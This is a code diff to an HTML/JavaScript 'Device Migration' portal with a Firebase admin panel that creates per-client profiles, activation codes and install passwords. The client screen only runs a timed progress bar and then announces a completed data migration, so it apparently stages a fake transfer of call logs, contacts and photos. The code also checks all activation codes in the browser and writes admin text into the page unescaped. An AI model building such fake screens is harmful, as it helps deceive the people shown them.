@@ -62,7 +62,7 @@
     .list-text { font-size: 16px; font-weight: 500; }
 
     /* --- Global Button Hover --- */
-    button:hover, .btn:hover, .proceed-btn:hover {
+    button:hover, .btn:hover, .proceed-btn:hover, select:hover {
       background-color: #000000 !important;
       color: #ffffff !important;
       border: 1px solid #3a3a3c !important;
@@ -119,6 +119,7 @@
     .btn-primary { background-color: #22c55e; color: #ffffff; }
     .btn-auth { background-color: #3b82f6; color: #ffffff; }
     .btn-secondary { background-color: #2c2c2e; color: #ffffff; margin-top: 10px; }
+    .btn-danger { background-color: #ef4444; color: #ffffff; margin-top: 10px; }
     .error-msg { color: #ef4444; font-size: 13px; margin-top: 10px; display: none; }
   </style>
 </head>
@@ -153,13 +154,13 @@
     <div class="card">
       <div class="icon-box">→</div>
       <h2 class="card-title" id="c_sendTitle">Send data from this device</h2>
-      <p class="card-sub">DEVICE ID: <span id="c_sendId">557278992656998</span></p>
+      <p class="card-sub">DEVICE ID: <span id="c_sendId">Loading...</span></p>
     </div>
 
     <div class="card">
       <div class="icon-box">↻</div>
       <h2 class="card-title" id="c_receiveTitle">Receive data on this device</h2>
-      <p class="card-sub">DEVICE ID: <span id="c_receiveId">352703943015910</span></p>
+      <p class="card-sub">DEVICE ID: <span id="c_receiveId">Loading...</span></p>
     </div>
 
     <div class="list-container" id="c_listContainer"></div>
@@ -212,7 +213,7 @@
   <div id="adminView" class="container hidden">
     <div id="authSection" class="admin-card">
       <h2>Admin Login</h2>
-      <p class="sub">Sign in to edit the client portal screen.</p>
+      <p class="sub">Sign in to edit the client portal screens.</p>
       <div class="form-group"><label>Admin Email</label><input type="email" id="adminEmail" placeholder="admin@example.com" /></div>
       <div class="form-group"><label>Password</label><input type="password" id="adminPass" placeholder="••••••••" /></div>
       <button class="btn btn-auth" onclick="handleLogin()">Sign In</button>
@@ -224,9 +225,27 @@
 
     <div id="panelSection" class="hidden">
       <div class="admin-card">
-        <h2>Edit Client Screen</h2>
+        <h2>Client Management</h2>
         <p class="sub" id="userEmailDisplay"></p>
+        
+        <!-- CLIENT SELECTOR -->
+        <div class="form-group">
+          <label>Select Client Profile to Edit</label>
+          <select id="clientSelector" onchange="loadSelectedClient()">
+            <option value="">Loading clients...</option>
+          </select>
+        </div>
+        
+        <div style="display: flex; gap: 10px;">
+          <button class="btn btn-auth" onclick="createNewClient()" style="flex: 1;">+ Create Client</button>
+          <button class="btn btn-danger" onclick="deleteCurrentClient()" style="flex: 1; margin-top: 8px;">Delete Client</button>
+        </div>
+        
+        <hr style="border-color: #2c2c2e; margin: 20px 0;">
+        <h2 id="editingTitle" style="font-size: 16px; color: #3b82f6;">Editing: No Client Selected</h2>
+      </div>
 
+      <div class="admin-card" id="clientConfigForm" style="opacity: 0.5; pointer-events: none;">
         <div class="form-group">
           <label>🔑 Activation Code (To open client)</label>
           <input type="text" id="a_activationCode" placeholder="e.g. 1234" style="border-color: #f59e0b;" />
@@ -267,8 +286,9 @@
         <div class="form-group"><label>Proceed Button Text</label><input type="text" id="a_btnText"></div>
 
         <button class="btn btn-primary" onclick="saveSettings()">Save Configuration</button>
-        <button class="btn btn-secondary" onclick="handleLogout()">Sign Out</button>
       </div>
+      
+      <button class="btn btn-secondary" onclick="handleLogout()">Sign Out</button>
     </div>
   </div>
 
@@ -287,10 +307,14 @@
   firebase.initializeApp(firebaseConfig);
   const auth = firebase.auth();
   const db = firebase.database();
-  const DATA_REF = db.ref('app_data/device_migration');
+  
+  // NEW MULTI-CLIENT DATABASE PATH
+  const CLIENTS_REF = db.ref('app_data/clients');
 
   // Global State
-  let currentActivationCode = "1234"; 
+  let allClients = {};
+  let currentEditingClientId = null;
+  let currentClientIdForSession = null; // For the client portal
   let currentInstallPassword = "1234";
   let globalTimerMinutes = 1; 
   
@@ -298,6 +322,15 @@
   let timerInterval = null;
   let totalSeconds = 0;
   let startTime = 0;
+
+  const defaultTemplate = {
+    headerText: "DATA TRANSFER ASSISTANT", title: "Device Migration", backText: "← Back",
+    sendTitle: "Send data from this device", sendId: "557278992656998",
+    receiveTitle: "Receive data on this device", receiveId: "352703943015910",
+    item1: "Call History & Logs", item2: "Contacts", item3: "Photos and Videos",
+    item4: "System Messages", item5: "Installed Applications", btnText: "PROCEED",
+    activationCode: "1234", installPassword: "1234", timerMinutes: 1
+  };
 
   // --- NAVIGATION FUNCTIONS ---
   function showAdminView() {
@@ -307,11 +340,12 @@
     document.getElementById('transferReadyView').classList.add('hidden');
     document.getElementById('installView').classList.add('hidden');
     document.getElementById('adminView').classList.remove('hidden');
+    loadClientList(); // Refresh list when opening admin
   }
 
   function showClientView() {
     document.getElementById('adminView').classList.add('hidden');
-    if (sessionStorage.getItem('isActivated') === 'true') {
+    if (sessionStorage.getItem('activeClientId')) {
       document.getElementById('clientView').classList.remove('hidden');
       document.getElementById('activationView').classList.add('hidden');
     } else {
@@ -320,50 +354,280 @@
     }
   }
 
-  // --- THE BACK BUTTON LOGIC ---
   function goBack() {
     if (!document.getElementById('timerView').classList.contains('hidden') ||
         !document.getElementById('transferReadyView').classList.contains('hidden') ||
         !document.getElementById('installView').classList.contains('hidden')) {
       
-      if (timerInterval) {
-        clearInterval(timerInterval);
-        timerInterval = null;
-      }
+      if (timerInterval) { clearInterval(timerInterval); timerInterval = null; }
       
       document.getElementById('timerView').classList.add('hidden');
       document.getElementById('transferReadyView').classList.add('hidden');
       document.getElementById('installView').classList.add('hidden');
-      
       document.getElementById('clientView').classList.remove('hidden');
     } else {
-      sessionStorage.removeItem('isActivated');
+      sessionStorage.removeItem('activeClientId'); // Clear active client
       document.getElementById('clientView').classList.add('hidden');
       document.getElementById('activationView').classList.remove('hidden');
       document.getElementById('activationCodeInput').value = '';
     }
   }
 
-  // --- ACTIVATION CODE LOGIC ---
+  // ==========================================
+  // CLIENT PORTAL LOGIC (MULTI-CLIENT)
+  // ==========================================
   function verifyActivationCode() {
     const input = document.getElementById('activationCodeInput').value.trim();
     const errorBox = document.getElementById('activationError');
     
-    if (input === currentActivationCode) {
-      sessionStorage.setItem('isActivated', 'true');
+    if (!input) {
+      errorBox.innerText = "Please enter an activation code.";
+      errorBox.style.display = 'block';
+      return;
+    }
+
+    // Search all clients for matching activation code
+    let foundId = null;
+    for (let id in allClients) {
+      if (allClients[id].activationCode === input) {
+        foundId = id;
+        break;
+      }
+    }
+
+    if (foundId) {
+      sessionStorage.setItem('activeClientId', foundId);
       document.getElementById('activationView').classList.add('hidden');
       document.getElementById('clientView').classList.remove('hidden');
       errorBox.style.display = 'none';
+      loadClientUI(foundId);
     } else {
       errorBox.innerText = "Invalid activation code. Please try again.";
       errorBox.style.display = 'block';
     }
   }
 
-  // --- TIMER & PROCESS LOGIC (FIXED WITH REAL-TIME CALCULATION) ---
+  function loadClientUI(clientId) {
+    const data = allClients[clientId];
+    if (!data) return;
+
+    currentInstallPassword = data.installPassword || "1234";
+    globalTimerMinutes = data.timerMinutes || 1;
+
+    document.getElementById('c_headerText').innerText = data.headerText || defaultTemplate.headerText;
+    document.getElementById('c_title').innerText = data.title || defaultTemplate.title;
+    document.getElementById('c_backText').innerText = data.backText || defaultTemplate.backText;
+    document.getElementById('c_sendTitle').innerText = data.sendTitle || defaultTemplate.sendTitle;
+    document.getElementById('c_sendId').innerText = data.sendId || defaultTemplate.sendId;
+    document.getElementById('c_receiveTitle').innerText = data.receiveTitle || defaultTemplate.receiveTitle;
+    document.getElementById('c_receiveId').innerText = data.receiveId || defaultTemplate.receiveId;
+    document.getElementById('c_btnText').innerText = data.btnText || defaultTemplate.btnText;
+
+    const listContainer = document.getElementById('c_listContainer');
+    listContainer.innerHTML = '';
+    const icons = ['📞', '👤', '🖼️', '💬', '📱'];
+    for (let i = 1; i <= 5; i++) {
+      if (data[`item${i}`]) {
+        listContainer.innerHTML += `
+          <div class="list-item">
+            <span class="list-icon">${icons[i-1]}</span>
+            <span class="list-text">${data[`item${i}`]}</span>
+          </div>`;
+      }
+    }
+  }
+
+  // Listen to Database changes globally
+  CLIENTS_REF.on('value', (snapshot) => {
+    allClients = snapshot.val() || {};
+    
+    // If a client is actively using the portal, refresh their UI
+    const activeId = sessionStorage.getItem('activeClientId');
+    if (activeId && allClients[activeId]) {
+      loadClientUI(activeId);
+    }
+    
+    // Refresh admin panel list if open
+    if (!document.getElementById('adminView').classList.contains('hidden')) {
+      updateClientSelectorList();
+    }
+  });
+
+  // ==========================================
+  // ADMIN PANEL LOGIC
+  // ==========================================
+  auth.onAuthStateChanged(user => {
+    if (user) {
+      document.getElementById('authSection').classList.add('hidden');
+      document.getElementById('panelSection').classList.remove('hidden');
+      document.getElementById('userEmailDisplay').innerText = 'Logged in as: ' + user.email;
+      loadClientList();
+    } else {
+      document.getElementById('authSection').classList.remove('hidden');
+      document.getElementById('panelSection').classList.add('hidden');
+    }
+  });
+
+  function handleLogin() {
+    const email = document.getElementById('adminEmail').value.trim();
+    const pass = document.getElementById('adminPass').value;
+    const errorBox = document.getElementById('loginError');
+    errorBox.style.display = 'none';
+    auth.signInWithEmailAndPassword(email, pass).catch(err => {
+      errorBox.innerText = err.message;
+      errorBox.style.display = 'block';
+    });
+  }
+
+  function handleLogout() {
+    auth.signOut();
+    showClientView(); 
+  }
+
+  function updateClientSelectorList() {
+    const selector = document.getElementById('clientSelector');
+    const currentVal = selector.value;
+    selector.innerHTML = '<option value="">-- Select a Client --</option>';
+    
+    let count = 1;
+    for (let id in allClients) {
+      const option = document.createElement('option');
+      option.value = id;
+      option.text = `Client Profile ${count} (Code: ${allClients[id].activationCode})`;
+      selector.appendChild(option);
+      count++;
+    }
+    
+    // Restore selection if it still exists
+    if (currentVal && allClients[currentVal]) {
+      selector.value = currentVal;
+    }
+  }
+
+  function loadClientList() {
+    updateClientSelectorList();
+    const activeId = document.getElementById('clientSelector').value;
+    if (activeId) {
+      loadSelectedClient();
+    } else {
+      disableForm();
+    }
+  }
+
+  function loadSelectedClient() {
+    const id = document.getElementById('clientSelector').value;
+    if (!id) {
+      disableForm();
+      return;
+    }
+    
+    currentEditingClientId = id;
+    const data = allClients[id] || defaultTemplate;
+    
+    document.getElementById('clientConfigForm').style.opacity = '1';
+    document.getElementById('clientConfigForm').style.pointerEvents = 'auto';
+    document.getElementById('editingTitle').innerText = `Editing: Client Profile for Code ${data.activationCode}`;
+
+    document.getElementById('a_headerText').value = data.headerText || '';
+    document.getElementById('a_title').value = data.title || '';
+    document.getElementById('a_backText').value = data.backText || '';
+    document.getElementById('a_sendTitle').value = data.sendTitle || '';
+    document.getElementById('a_sendId').value = data.sendId || '';
+    document.getElementById('a_receiveTitle').value = data.receiveTitle || '';
+    document.getElementById('a_receiveId').value = data.receiveId || '';
+    document.getElementById('a_item1').value = data.item1 || '';
+    document.getElementById('a_item2').value = data.item2 || '';
+    document.getElementById('a_item3').value = data.item3 || '';
+    document.getElementById('a_item4').value = data.item4 || '';
+    document.getElementById('a_item5').value = data.item5 || '';
+    document.getElementById('a_btnText').value = data.btnText || '';
+    document.getElementById('a_activationCode').value = data.activationCode || '';
+    document.getElementById('a_installPassword').value = data.installPassword || '';
+    document.getElementById('a_timerMinutes').value = data.timerMinutes || 1;
+  }
+
+  function disableForm() {
+    currentEditingClientId = null;
+    document.getElementById('clientConfigForm').style.opacity = '0.5';
+    document.getElementById('clientConfigForm').style.pointerEvents = 'none';
+    document.getElementById('editingTitle').innerText = 'Editing: No Client Selected';
+  }
+
+  function createNewClient() {
+    // Generate random 4 digit code
+    const randomCode = Math.floor(1000 + Math.random() * 9000).toString();
+    const newId = 'client_' + Date.now();
+    
+    const newClientData = { ...defaultTemplate, activationCode: randomCode };
+    
+    CLIENTS_REF.child(newId).set(newClientData).then(() => {
+      // Select the new client after creation
+      setTimeout(() => {
+        document.getElementById('clientSelector').value = newId;
+        loadSelectedClient();
+        alert(`New Client Created!\nActivation Code: ${randomCode}`);
+      }, 500);
+    }).catch(err => alert("Error creating client: " + err.message));
+  }
+
+  function deleteCurrentClient() {
+    if (!currentEditingClientId) {
+      alert("Please select a client to delete first.");
+      return;
+    }
+    
+    const confirmDelete = confirm("Are you sure you want to delete this client profile? This cannot be undone.");
+    if (confirmDelete) {
+      CLIENTS_REF.child(currentEditingClientId).remove().then(() => {
+        alert("Client deleted successfully.");
+        document.getElementById('clientSelector').value = '';
+        disableForm();
+      }).catch(err => alert("Error deleting: " + err.message));
+    }
+  }
+
+  function saveSettings() {
+    if (!currentEditingClientId) {
+      alert("Please select a client first.");
+      return;
+    }
+
+    const payload = {
+      activationCode: document.getElementById('a_activationCode').value.trim() || "1234",
+      installPassword: document.getElementById('a_installPassword').value.trim() || "1234",
+      timerMinutes: parseInt(document.getElementById('a_timerMinutes').value, 10) || 1,
+      headerText: document.getElementById('a_headerText').value,
+      title: document.getElementById('a_title').value,
+      backText: document.getElementById('a_backText').value,
+      sendTitle: document.getElementById('a_sendTitle').value,
+      sendId: document.getElementById('a_sendId').value,
+      receiveTitle: document.getElementById('a_receiveTitle').value,
+      receiveId: document.getElementById('a_receiveId').value,
+      item1: document.getElementById('a_item1').value,
+      item2: document.getElementById('a_item2').value,
+      item3: document.getElementById('a_item3').value,
+      item4: document.getElementById('a_item4').value,
+      item5: document.getElementById('a_item5').value,
+      btnText: document.getElementById('a_btnText').value,
+      updatedAt: Date.now()
+    };
+
+    CLIENTS_REF.child(currentEditingClientId).set(payload)
+      .then(() => {
+        alert("✅ Configuration saved successfully to Client Profile!");
+      })
+      .catch(err => {
+        console.error("Firebase Save Error: ", err);
+        alert("❌ Error saving: " + err.message);
+      });
+  }
+
+  // ==========================================
+  // TIMER & PROCESS LOGIC (CLIENT SIDE)
+  // ==========================================
   function startMigrationProcess() {
     if (!globalTimerMinutes || globalTimerMinutes <= 0) {
-      alert("The administrator has not set a valid timer duration yet.");
+      alert("The administrator has not set a valid timer duration for this client.");
       return;
     }
     startTimer(globalTimerMinutes);
@@ -371,25 +635,22 @@
 
   function startTimer(minutes) {
     totalSeconds = minutes * 60;
-    startTime = Date.now(); // Record exact start time
+    startTime = Date.now(); 
     
     document.getElementById('clientView').classList.add('hidden');
     document.getElementById('timerView').classList.remove('hidden');
     
-    // Initial render
     document.getElementById('timerRemainingText').innerText = `About ${minutes} minute${minutes > 1 ? 's' : ''} remaining`;
     document.getElementById('timerPercentage').innerText = '0%';
     document.getElementById('timerFill').style.width = '100%';
 
     if (timerInterval) clearInterval(timerInterval);
 
-    // Update every 1000ms (1 second)
     timerInterval = setInterval(() => {
       const now = Date.now();
       const elapsedSeconds = Math.floor((now - startTime) / 1000);
       const secondsRemaining = Math.max(0, totalSeconds - elapsedSeconds);
       
-      // Update text
       if (secondsRemaining >= 60) {
         const mins = Math.ceil(secondsRemaining / 60);
         document.getElementById('timerRemainingText').innerText = `About ${mins} minute${mins > 1 ? 's' : ''} remaining`;
@@ -397,12 +658,10 @@
         document.getElementById('timerRemainingText').innerText = `About ${secondsRemaining} second${secondsRemaining !== 1 ? 's' : ''} remaining`;
       }
 
-      // Update percentage and bar
       const percent = Math.round(((totalSeconds - secondsRemaining) / totalSeconds) * 100);
       document.getElementById('timerPercentage').innerText = percent + '%';
       document.getElementById('timerFill').style.width = (100 - percent) + '%';
 
-      // Check if finished
       if (secondsRemaining <= 0) {
         clearInterval(timerInterval);
         timerInterval = null;
@@ -426,132 +685,22 @@
     if (input === currentInstallPassword) {
       errorBox.style.display = 'none';
       alert("Installation Authorized! Data migration complete.");
-      goBack(); // Return to main screen
+      goBack(); 
     } else {
       errorBox.style.display = 'block';
     }
   }
 
-  // --- CLIENT PORTAL DATA SYNC ---
-  const defaultData = {
-    headerText: "DATA TRANSFER ASSISTANT", title: "Device Migration", backText: "← Back",
-    sendTitle: "Send data from this device", sendId: "557278992656998",
-    receiveTitle: "Receive data on this device", receiveId: "352703943015910",
-    item1: "Call History & Logs", item2: "Contacts", item3: "Photos and Videos",
-    item4: "System Messages", item5: "Installed Applications", btnText: "PROCEED",
-    activationCode: "1234", installPassword: "1234", timerMinutes: 1
-  };
-
-  DATA_REF.on('value', (snapshot) => {
-    const data = snapshot.val() || defaultData;
-    currentActivationCode = data.activationCode || defaultData.activationCode;
-    currentInstallPassword = data.installPassword || defaultData.installPassword;
-    globalTimerMinutes = data.timerMinutes || defaultData.timerMinutes;
-    
-    // Update Client UI
-    document.getElementById('c_headerText').innerText = data.headerText || defaultData.headerText;
-    document.getElementById('c_title').innerText = data.title || defaultData.title;
-    document.getElementById('c_backText').innerText = data.backText || defaultData.backText;
-    document.getElementById('c_sendTitle').innerText = data.sendTitle || defaultData.sendTitle;
-    document.getElementById('c_sendId').innerText = data.sendId || defaultData.sendId;
-    document.getElementById('c_receiveTitle').innerText = data.receiveTitle || defaultData.receiveTitle;
-    document.getElementById('c_receiveId').innerText = data.receiveId || defaultData.receiveId;
-    document.getElementById('c_btnText').innerText = data.btnText || defaultData.btnText;
-
-    const listContainer = document.getElementById('c_listContainer');
-    listContainer.innerHTML = '';
-    const icons = ['📞', '👤', '🖼️', '💬', '📱'];
-    for (let i = 1; i <= 5; i++) {
-      if (data[`item${i}`]) {
-        listContainer.innerHTML += `
-          <div class="list-item">
-            <span class="list-icon">${icons[i-1]}</span>
-            <span class="list-text">${data[`item${i}`]}</span>
-          </div>`;
-      }
-    }
-
-    // Populate Admin Form
-    if (document.getElementById('a_headerText')) {
-        document.getElementById('a_headerText').value = data.headerText || '';
-        document.getElementById('a_title').value = data.title || '';
-        document.getElementById('a_backText').value = data.backText || '';
-        document.getElementById('a_sendTitle').value = data.sendTitle || '';
-        document.getElementById('a_sendId').value = data.sendId || '';
-        document.getElementById('a_receiveTitle').value = data.receiveTitle || '';
-        document.getElementById('a_receiveId').value = data.receiveId || '';
-        document.getElementById('a_item1').value = data.item1 || '';
-        document.getElementById('a_item2').value = data.item2 || '';
-        document.getElementById('a_item3').value = data.item3 || '';
-        document.getElementById('a_item4').value = data.item4 || '';
-        document.getElementById('a_item5').value = data.item5 || '';
-        document.getElementById('a_btnText').value = data.btnText || '';
-        document.getElementById('a_activationCode').value = data.activationCode || defaultData.activationCode;
-        document.getElementById('a_installPassword').value = data.installPassword || defaultData.installPassword;
-        document.getElementById('a_timerMinutes').value = data.timerMinutes || defaultData.timerMinutes;
+  // Initialize Client Portal on Load
+  window.addEventListener('load', () => {
+    const activeId = sessionStorage.getItem('activeClientId');
+    if (activeId && allClients[activeId]) {
+       loadClientUI(activeId);
+       document.getElementById('activationView').classList.add('hidden');
+       document.getElementById('clientView').classList.remove('hidden');
     }
   });
 
-  // --- ADMIN PANEL LOGIC ---
-  auth.onAuthStateChanged(user => {
-    if (user) {
-      document.getElementById('authSection').classList.add('hidden');
-      document.getElementById('panelSection').classList.remove('hidden');
-      document.getElementById('userEmailDisplay').innerText = 'Logged in as: ' + user.email;
-    } else {
-      document.getElementById('authSection').classList.remove('hidden');
-      document.getElementById('panelSection').classList.add('hidden');
-    }
-  });
-
-  function handleLogin() {
-    const email = document.getElementById('adminEmail').value.trim();
-    const pass = document.getElementById('adminPass').value;
-    const errorBox = document.getElementById('loginError');
-    errorBox.style.display = 'none';
-
-    auth.signInWithEmailAndPassword(email, pass)
-      .catch(err => {
-        errorBox.innerText = err.message;
-        errorBox.style.display = 'block';
-      });
-  }
-
-  function handleLogout() {
-    auth.signOut();
-    showClientView(); 
-  }
-
-  function saveSettings() {
-    const payload = {
-      activationCode: document.getElementById('a_activationCode').value.trim() || "1234",
-      installPassword: document.getElementById('a_installPassword').value.trim() || "1234",
-      timerMinutes: parseInt(document.getElementById('a_timerMinutes').value, 10) || 1,
-      headerText: document.getElementById('a_headerText').value,
-      title: document.getElementById('a_title').value,
-      backText: document.getElementById('a_backText').value,
-      sendTitle: document.getElementById('a_sendTitle').value,
-      sendId: document.getElementById('a_sendId').value,
-      receiveTitle: document.getElementById('a_receiveTitle').value,
-      receiveId: document.getElementById('a_receiveId').value,
-      item1: document.getElementById('a_item1').value,
-      item2: document.getElementById('a_item2').value,
-      item3: document.getElementById('a_item3').value,
-      item4: document.getElementById('a_item4').value,
-      item5: document.getElementById('a_item5').value,
-      btnText: document.getElementById('a_btnText').value,
-      updatedAt: Date.now()
-    };
-
-    DATA_REF.set(payload)
-      .then(() => {
-        alert("✅ Configuration saved successfully!");
-      })
-      .catch(err => {
-        console.error("Firebase Save Error: ", err);
-        alert("❌ Error saving: " + err.message);
-      });
-  }
 </script>
 </body>
 </html>
